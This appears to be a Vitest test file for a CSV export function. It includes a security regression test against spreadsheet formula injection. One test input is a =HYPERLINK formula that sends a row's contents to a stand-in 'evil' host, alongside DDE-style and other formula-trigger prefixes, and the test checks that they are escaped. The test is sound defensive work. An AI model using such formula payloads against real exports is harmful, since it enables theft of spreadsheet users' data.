import { describe, expect, it } from 'vitest'
import { toCsv } from './download'

describe('toCsv', () => {
  it('quotes only what needs it, doubles quotes, and writes objects as JSON and nulls as empty', () => {
    expect(toCsv([['name', 'note'], ['Ana', 'a, b'], ['Bo "B"', null], ['x', { a: 1 }], ['line\nbreak', 3]]))
      .toBe('name,note\nAna,"a, b"\n"Bo ""B""",\nx,"{""a"":1}"\n"line\nbreak",3')
  })
})

// Security regression (DataViews.md §5.10): a record's text opened as a formula in a spreadsheet - =HYPERLINK(...)
// sending the row away, or a DDE command.
describe('a CSV cell a spreadsheet would read as a formula', () => {
  it('starts with a quote mark when it is text; a number stays a number', () => {
    expect(toCsv([['=HYPERLINK("https://evil/?"&A2,"x")', '+1', '-cmd', '@SUM(A1)', '\tx', 'plain']]))
      .toBe(`"'=HYPERLINK(""https://evil/?""&A2,""x"")",'+1,'-cmd,'@SUM(A1),'\tx,plain`)
    expect(toCsv([[-5, 3.5]])).toBe('-5,3.5')
  })
})
